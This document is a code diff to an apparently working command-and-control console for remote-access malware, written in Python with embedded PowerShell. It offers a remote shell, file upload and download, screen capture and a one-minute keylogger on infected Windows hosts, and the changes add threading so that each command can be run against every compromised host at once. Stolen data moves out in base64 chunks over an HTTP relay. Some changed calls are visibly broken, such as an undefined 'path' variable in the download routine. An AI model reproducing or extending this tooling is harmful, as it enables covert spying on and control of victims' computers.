@@ -4,6 +4,7 @@ import logging
 import requests
 import argparse
 import subprocess
+import multiprocessing.dummy
 
 CMD_ID = '@'
 UPLOAD_ID = '^'
@@ -28,7 +29,7 @@ class Shell(object):
    /# =========`-_       +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
   /# (--====___====\     |S|H|O|W| |M|E| |W|H|A|T| |Y|O|U| |G|O|T|
  /#   .- --.  . --.|     +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
-/##   |  * ) (   * ),                         Author: Aaron Reyes
+/##   |  * ) (   * ),                   Author: Mr. Poopy Butthole
 |##   \    /\ \   / |
 |###   ---   \ ---  |
 |####      ___)    #|    Type 'help' for a list of commands
@@ -62,8 +63,8 @@ class Shell(object):
   $g = [System.Drawing.Graphics]::FromImage($b);
   $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),$b.Size);
   $g.Dispose();
-  $b.Save('_.png');
-  Get-ItemProperty '_.png';
+  $b.Save('_.jpeg', ([system.drawing.imaging.imageformat]::Jpeg));
+  Get-ItemProperty '_.jpeg';
   """
   KEYLOGGER_SCRIPT = r"""
   $i = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);';
@@ -131,63 +132,64 @@ class Shell(object):
     if len(d) > SIZE_LIMIT:
       logging.error('data size {0}B is beyond size limit of {1}B'.format(len(d), SIZE_LIMIT))
       return ''
+    key = ''.join([user, '@', ip])
     s = ip + '|' + user
     dx = base64.b64encode(d).decode('UTF-8')
     # wait to send data
-    logging.info('(1/6) waiting on TxR = 0 ...')
+    logging.info('[{0}] (1/6) waiting on TxR = 0 ...'.format(key))
     while True:
       r = requests.get(self.srv, params={'TxR': '{0}'.format(self.__e(s))})
       if r.status_code != requests.codes.ok:
-        logging.error('TxR GET request failed: {0}'.format(r.status_code))
+        logging.error('[{0}] TxR GET request failed: {1}'.format(key, r.status_code))
         return ''
-      logging.debug('TxR: {0}'.format(r.content.decode('UTF-8')))
+      logging.debug('[{0}] TxR: {1}'.format(key, r.content.decode('UTF-8')))
       if r.content.decode('UTF-8') == '0':
         break
     # send data
-    logging.info('(2/6) sending Tx data ...')
+    logging.info('[{0}] (2/6) sending Tx data ...'.format(key))
     col = 3
     for i in range(0, len(dx), CHUNK_SIZE):
       r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|', str(col)])))}, data={'d': dx[i:i+CHUNK_SIZE]})
       if r.status_code != requests.codes.ok:
-        logging.error('Tx POST request failed: {0}'.format(r.status_code))
+        logging.error('[{0}] Tx POST request failed: {1}'.format(key, r.status_code))
         return ''
-      logging.debug('TxD[{0}]: {1}'.format(col - 3, dx[i:i+CHUNK_SIZE]))
+      logging.debug('[{0}] TxD[{1}]: {2}'.format(key, col - 3, dx[i:i+CHUNK_SIZE]))
       col = col + 1
     # set data type
-    logging.info('(3/6) setting TxR = {0} ...'.format(d_type))
+    logging.info('[{0}] (3/6) setting TxR = {1} ...'.format(key, d_type))
     r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|2'])))}, data={'d': d_type})
     if r.status_code != requests.codes.ok:
-      logging.error('Tx POST request failed: {0}'.format(r.status_code))
+      logging.error('[{0}] Tx POST request failed: {1}'.format(key, r.status_code))
       return ''
     # wait to get data
-    logging.info('(4/6) waiting on RxR = 1 ...')
+    logging.info('[{0}] (4/6) waiting on RxR = 1 ...'.format(key))
     while True:
       r = requests.get(self.srv, params={'RxR': '{0}'.format(self.__e(s))})
       if r.status_code != requests.codes.ok:
-        logging.error('RxR GET request failed: {0}'.format(r.status_code))
+        logging.error('[{0}] RxR GET request failed: {1}'.format(key, r.status_code))
         return ''
-      logging.debug('RxR: {0}'.format(r.content.decode('UTF-8')))
+      logging.debug('[{0}] RxR: {1}'.format(key, r.content.decode('UTF-8')))
       if r.content.decode('UTF-8') == '1':
         break
     # download data
     col = 3
     buf = []
-    logging.info('(5/6) downloading Rx data ...')
+    logging.info('[{0}] (5/6) downloading Rx data ...'.format(key))
     while True:
       r = requests.get(self.srv, params={'RxD': '{0}'.format(self.__e(''.join([s, '|', str(col)])))})
       if r.status_code != requests.codes.ok:
-        logging.error('RxD GET request failed: {0}'.format(r.status_code))
+        logging.error('[{0}] RxD GET request failed: {1}'.format(key, r.status_code))
         return ''
       if r.content.decode('UTF-8') == '':
         break
-      logging.debug('RxD[{0}]: {1}'.format(col - 3, r.content.decode('UTF-8')))
+      logging.debug('[{0}] RxD[{1}]: {2}'.format(key, col - 3, r.content.decode('UTF-8')))
       buf.append(r.content.decode('UTF-8'))
       col = col + 1
     # ACK download of data
-    logging.info('(6/6) setting RxR = 0 ...')
+    logging.info('[{0}] (6/6) setting RxR = 0 ...'.format(key))
     r = requests.post(self.srv, params={'Rx': '{0}'.format(self.__e(''.join([s, '|2'])))}, data={'d': '0'})
     if r.status_code != requests.codes.ok:
-      logging.error('Rx POST request failed: {0}'.format(r.status_code))
+      logging.error('[{0}] Rx POST request failed: {1}'.format(key, r.status_code))
       return ''
     # return array of chunked data
     return buf
@@ -195,13 +197,24 @@ class Shell(object):
   def help(self):
     print('ls                     - list all active clients')
     print('run        <cmd>       - run command locally')
-    print('screenshot <ip>        - capture screen on <ip>')
-    print('keylogger  <ip>        - capture ASCII keystrokes on <ip> for 1 minute')
-    print('info       <ip>        - gather basic info about <ip>')
+    print('screenshot <ip>        - capture screen on <ip> or all')
+    print('keylogger  <ip>        - capture ASCII keystrokes on <ip> or all for 1 minute')
+    print('info       <ip>        - gather basic info about <ip> or all')
     print('shell      <ip>        - run powershell commands on <ip>')
-    print('upload     <ip> <file> - upload local <file> to <ip>')
-    print('download   <ip> <file> - download remote <file> from <ip>')
+    print('upload     <ip> <file> - upload local <file> to <ip> or all')
+    print('download   <ip> <file> - download remote <file> from <ip> or all')
     print('quit                   - exit')
+
+  def thread(self, f, ip, d):
+    if ip != 'all':
+      f({'ip':ip,'args':d})
+      return
+    # identify targets
+    hosts = self.ls()
+    # spawn threads for request
+    threads = multiprocessing.dummy.Pool(len(hosts))
+    r = threads.map(f, [{'ip':h['ip'],'args':d} for h in hosts])
+    print('DONE')
 
   def ls(self):
     r = requests.get(self.srv, params={'ls': ''})
@@ -217,6 +230,7 @@ class Shell(object):
       if not hosts:
         logging.info('no hosts found')
       self.hosts = hosts
+    return self.hosts
 
   def run(self, cmd):
     try:
@@ -224,130 +238,138 @@ class Shell(object):
     except:
       logging.error('failed to run command: {0}'.format(cmd))
 
-  def shell(self, ip):
+  def shell(self, d):
     logging.info('enter "quit" to exit shell')
     if not self.hosts:
       logging.error('no hosts loaded. try running "ls"')
       return
-    user = self.__u(ip)
+    user = self.__u(d['ip'])
     if not user:
-      logging.error('invalid ip: {0}'.format(ip))
+      logging.error('invalid ip: {0}'.format(d['ip']))
       return
     while True:
-      cmd = input('{0}@{1} PS> '.format(user, ip)).lower()
+      cmd = input('{0}@{1} PS> '.format(user, d['ip'])).lower()
       if cmd in ['e', 'q', 'exit', 'quit']:
-        logging.info('exiting shell on {0}'.format(ip))
+        logging.info('exiting shell on {0}'.format(d['ip']))
         break
       if cmd.strip():
-        d = self.__r(ip, user, cmd.encode('UTF-16LE'), CMD_ID)
-        print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+        r = self.__r(d['ip'], user, cmd.encode('UTF-16LE'), CMD_ID)
+        print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
 
-  def upload(self, ip, path):
+  def upload(self, d):
     if not self.hosts:
       logging.error('no hosts loaded. try running "ls"')
       return
-    user = self.__u(ip)
+    user = self.__u(d['ip'])
     if not user:
-      logging.error('invalid ip: {0}'.format(ip))
+      logging.error('invalid ip: {0}'.format(d['ip']))
       return
+    key = ''.join([user, '@', d['ip']])
     try:
-      with open(path, 'rb') as f:
-        d = self.__r(ip, user, f.read(), os.path.basename(path))
-        print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+      with open(d['args']['path'], 'rb') as f:
+        r = self.__r(d['ip'], user, f.read(), os.path.basename(d['args']['path']))
+        print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
+      print('[{0}] SUCCESS - uploaded file {1}'.format(key, d['args']['path']))
     except:
-      logging.error('failed to send file: {0}'.format(path))
+      logging.error('[{0}] failed to send file: {1}'.format(key, d['args']['path']))
 
-  def download(self, ip, path):
+  def download(self, d):
     if not self.hosts:
       logging.error('no hosts loaded. try running "ls"')
       return
-    user = self.__u(ip)
+    user = self.__u(d['ip'])
     if not user:
-      logging.error('invalid ip: {0}'.format(ip))
+      logging.error('invalid ip: {0}'.format(d['ip']))
       return
+    key = ''.join([user, '@', d['ip']])
     try:
-      with open(path, 'wb') as f:
-        d = self.__r(ip, user, path.encode('UTF-8'), UPLOAD_ID)
-        f.write(b''.join([base64.b64decode(c) for c in d]))
-      print('SUCCESS')
+      filename = ''.join([user, '-', d['ip'], '-', d['args']['path']])
+      with open(filename, 'wb') as f:
+        r = self.__r(d['ip'], user, path.encode('UTF-8'), UPLOAD_ID)
+        f.write(b''.join([base64.b64decode(c) for c in r]))
+      print('[{0}] SUCCESS - downloaded file {1} as {2}'.format(key, d['args']['path'], filename))
     except:
-      logging.error('failed to download file: {0}'.format(path))
+      logging.error('[{0}] failed to download file {1} as {2}'.format(key, d['args']['path'], filename))
 
-  def screenshot(self, ip):
+  def screenshot(self, d):
     if not self.hosts:
       logging.error('no hosts loaded. try running "ls"')
       return
-    user = self.__u(ip)
+    user = self.__u(d['ip'])
     if not user:
-      logging.error('invalid ip: {0}'.format(ip))
+      logging.error('invalid ip: {0}'.format(d['ip']))
       return
-    # run script to make screen shot
-    logging.info('generating screenshot file _.png on {0} ...'.format(ip))
+    key = ''.join([user, '@', d['ip']])
+    # run script to make screenshot
+    logging.info('[{0}] generating screenshot file _.jpeg ...'.format(key))
     try:
-      d = self.__r(ip, user, self.SCREENSHOT_SCRIPT.encode('UTF-16LE'), CMD_ID)
-      print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+      r = self.__r(d['ip'], user, self.SCREENSHOT_SCRIPT.encode('UTF-16LE'), CMD_ID)
+      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
     except:
-      logging.error('failed to run screenshot script: {0}'.format(self.SCREENSHOT_SCRIPT))
+      logging.error('[{0}] failed to run screenshot script: {1}'.format(key, self.SCREENSHOT_SCRIPT))
     # download screenshot
-    logging.info('downloading screenshot file _.png from {0} ...'.format(ip))
+    logging.info('[{0}] downloading screenshot file _.jpeg ...'.format(key))
     try:
-      self.download(ip, '_.png')
+      self.download(d['ip'], '_.jpeg')
     except:
-      logging.error('failed to download screenshot file: _.png')
+      logging.error('[{0}] failed to download screenshot file: _.jpeg'.format(key))
     # delete screenshot file
-    logging.info('deleting screenshot file _.png from {0} ...'.format(ip))
+    logging.info('[{0}] deleting screenshot file _.jpeg ...'.format(key))
     try:
-      d = self.__r(ip, user, 'del _.png'.encode('UTF-16LE'), CMD_ID)
-      print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+      r = self.__r(d['ip'], user, 'del _.jpeg'.encode('UTF-16LE'), CMD_ID)
+      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
     except:
-      logging.error('failed to delete screenshot file _.png on {0}'.format(ip))
-    print('SUCCESS - downloaded file _.png')
+      logging.error('[{0}] failed to delete screenshot file _.jpeg'.format(key))
+    print('[{0}] SUCCESS - downloaded file _.jpeg'.format(key))
 
-  def keylogger(self, ip):
+  def keylogger(self, d):
     if not self.hosts:
       logging.error('no hosts loaded. try running "ls"')
       return
-    user = self.__u(ip)
+    user = self.__u(d['ip'])
     if not user:
-      logging.error('invalid ip: {0}'.format(ip))
+      logging.error('invalid ip: {0}'.format(d['ip']))
       return
+    key = ''.join([user, '@', d['ip']])
     # run script to make log
-    logging.info('running keylogger for 1 minute on {0} ...'.format(ip))
+    logging.info('[{0}] running keylogger for 1 minute ...'.format(key))
     try:
-      d = self.__r(ip, user, self.KEYLOGGER_SCRIPT.encode('UTF-16LE'), CMD_ID)
-      print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+      r = self.__r(d['ip'], user, self.KEYLOGGER_SCRIPT.encode('UTF-16LE'), CMD_ID)
+      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
     except:
-      logging.error('failed to run keylogger script: {0}'.format(self.KEYLOGGER_SCRIPT))
+      logging.error('[{0}] failed to run keylogger script: {1}'.format(key, self.KEYLOGGER_SCRIPT))
     # download log
-    logging.info('downloading keylogger file _.txt from {0} ...'.format(ip))
+    logging.info('[{0}] downloading keylogger file _.txt ...'.format(key))
     try:
-      self.download(ip, '_.txt')
+      self.download(d['ip'], '_.txt')
     except:
-      logging.error('failed to download keylogger file: _.txt')
+      logging.error('[{0}] failed to download keylogger file: _.txt'.format(key))
     # delete keylogger file
-    logging.info('deleting keylogger file _.txt from {0} ...'.format(ip))
+    logging.info('[{0}] deleting keylogger file _.txt ...'.format(key))
     try:
-      d = self.__r(ip, user, 'del _.txt'.encode('UTF-16LE'), CMD_ID)
-      print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+      r = self.__r(d['ip'], user, 'del _.txt'.encode('UTF-16LE'), CMD_ID)
+      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
     except:
-      logging.error('failed to delete keylogger file _.txt on {0}'.format(ip))
-    print('SUCCESS - downloaded file _.txt')
+      logging.error('[{0}] failed to delete keylogger file _.txt'.format(key))
+    print('[{0}] SUCCESS - downloaded file _.txt'.format(key))
 
-  def info(self, ip):
+  def info(self, d):
     if not self.hosts:
       logging.error('no hosts loaded. try running "ls"')
       return
-    user = self.__u(ip)
+    user = self.__u(d['ip'])
     if not user:
-      logging.error('invalid ip: {0}'.format(ip))
+      logging.error('invalid ip: {0}'.format(d['ip']))
       return
+    key = ''.join([user, '@', d['ip']])
     # run script to make log
-    logging.info('gathering info on {0} ...'.format(ip))
+    logging.info('[{0}] gathering info ...'.format(key))
     try:
-      d = self.__r(ip, user, self.INFO_SCRIPT.encode('UTF-16LE'), CMD_ID)
-      print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+      r = self.__r(d['ip'], user, self.INFO_SCRIPT.encode('UTF-16LE'), CMD_ID)
+      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
     except:
-      logging.error('failed to run info script: {0}'.format(self.INFO_SCRIPT))
+      logging.error('[{0}] failed to run info script: {0}'.format(key, self.INFO_SCRIPT))
+
 
 if __name__ == '__main__':
   # parse user arguments
@@ -373,36 +395,36 @@ if __name__ == '__main__':
       if len(sh_args) != 1:
         logging.error('invalid arguments. run "help"')
         continue
-      sh.shell(sh_args[0])
+      sh.thread(sh.shell, sh_args[0], {})
     if c.startswith('info'):
       sh_args = c.replace('info', '').strip().split(' ')
       if len(sh_args) != 1:
         logging.error('invalid arguments. run "help"')
         continue
-      sh.info(sh_args[0])
+      sh.thread(sh.info, sh_args[0], {})
     if c.startswith('screenshot'):
       sh_args = c.replace('screenshot', '').strip().split(' ')
       if len(sh_args) != 1:
         logging.error('invalid arguments. run "help"')
         continue
-      sh.screenshot(sh_args[0])
+      sh.thread(sh.screenshot, sh_args[0], {})
     if c.startswith('keylogger'):
       sh_args = c.replace('keylogger', '').strip().split(' ')
       if len(sh_args) != 1:
         logging.error('invalid arguments. run "help"')
         continue
-      sh.keylogger(sh_args[0])
+      sh.thread(sh.keylogger, sh_args[0], {})
     if c.startswith('upload'):
       sh_args = c.replace('upload', '').strip().split(' ')
       if len(sh_args) != 2:
         logging.error('invalid arguments. run "help"')
         continue
-      sh.upload(sh_args[0], sh_args[1])
+      sh.thread(sh.upload, sh_args[0], {'path':sh_args[1]})
     if c.startswith('download'):
       sh_args = c.replace('download', '').strip().split(' ')
       if len(sh_args) != 2:
         logging.error('invalid arguments. run "help"')
         continue
-      sh.download(sh_args[0], sh_args[1])
+      sh.thread(sh.download, sh_args[0], {'path':sh_args[1]})
     if c in ['e', 'q', 'exit', 'quit']:
       break
